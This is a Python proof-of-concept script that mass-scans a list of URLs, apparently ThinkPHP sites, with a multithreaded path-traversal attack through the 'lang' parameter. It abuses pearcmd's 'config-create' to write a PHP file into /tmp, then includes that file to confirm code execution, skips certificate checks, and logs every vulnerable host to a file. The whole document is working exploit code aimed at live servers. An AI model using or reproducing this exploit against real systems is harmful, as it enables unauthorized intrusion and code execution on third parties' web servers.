import sys
import requests
from bs4 import BeautifulSoup
requests.packages.urllib3.disable_warnings()


import urllib.request
from concurrent.futures import ThreadPoolExecutor
import ssl



def Run(url_file,max_thread=20):
    urllist = []
    with open(str(url_file)) as f:
        while True:
            line = str(f.readline()).strip()
            if line:
                urllist.append(line)
            else:
                break
    l=[]
    p = ThreadPoolExecutor(max_thread)
    for url in urllist:
        obj = p.submit(POC, url)
        l.append(obj)
    p.shutdown()



def POC(url):
    session = requests.Session()
#    proxies = {
#        'http': '127.0.0.1:41011',
#        'https': '127.0.0.1:41011'
#    }
    print(url)

    

    try:

        headers = {
            "Content-Type":"application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2227.0 Safari/538.31",
            "Connection": "close"
            }
        path="/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=phpinfo()?>+/tmp/hello.php"
        path2="/index.php?lang=../../../../../../../../../../../../../tmp/hello"

        #生成证书上下文(unverified 就是不验证https证书)
        context = ssl._create_unverified_context()
        r = urllib.request.urlopen(url+path,timeout=20,context=context)               
        flag = 'pear.php'
        x = r.read().decode('utf-8')
        if flag in x:
            print(url+path2,":::success!!!\n")
            r2 = requests.get(url.strip("/") + path2, headers=headers,verify=False,timeout=20)
            fresult=open('results!!!!!!!.txt','a')                      # this is output result
            fresult.write(url+path2+"\n")
            fresult.close()
        else:
            print("No Vuln!!!")

    except Exception as e:
        print(e)


if __name__ == '__main__':
    Run("thinkurl.txt",50)